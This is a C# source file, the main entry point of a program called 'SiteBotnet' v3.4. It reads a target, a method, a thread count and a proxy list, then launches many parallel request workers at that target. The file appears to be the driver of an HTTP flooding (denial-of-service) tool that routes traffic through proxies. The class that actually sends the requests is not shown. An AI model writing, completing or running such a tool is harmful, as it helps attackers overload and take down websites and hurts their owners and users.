using System;
using System.Collections.Generic;
using System.IO;
using SharpConfigParser;

namespace SiteBotnet3
{
    class Program
    {
        private static readonly string AppName = "SiteBotnet";
        private static readonly string AppVersion = "3.4";

        public static readonly Random Rand = new Random();

        static void Main(string[] args)
        {
            if (!File.Exists("proxies.txt")) File.WriteAllText("proxies.txt", string.Empty);

            string Method;
            string Target;
            int Threads;
            string ProxyType;
            List<string> ProxyList = new List<string>(File.ReadAllLines("proxies.txt"));

            if (args.Length == 0)
            {
                Parser p = new Parser() { ConfigFile = "config.txt" };
                Method = p.Read("Method").ToString().Split('=')[1].ReplaceSpaces();
                Target = p.Read("Target").ToString().Split('=')[1].ReplaceSpaces();
                Threads = Convert.ToInt32(p.Read("Threads").ToString().Split('=')[1].ReplaceSpaces());
                ProxyType = p.Read("ProxyType").ToString().Split('=')[1].ReplaceSpaces();
            }
            else
            {
                Method = args[0];
                Target = args[1];
                Threads = Convert.ToInt32(args[2]);
                ProxyType = args[3];
            }

            Console.Title = AppName + " v" + AppVersion;

            for (int i = 0; i < Threads; i++)
            {
                Requests req = new Requests("[ThreadHttp-" + i + "]");
                req.SetMethod(Method);
                req.SetTarget(Target);
                req.SetThreads(Threads);
                req.SetProxyType(ProxyType);
                req.SetProxyList(ProxyList);
                req.Start(true);
            }

            return;
        }
    }
}
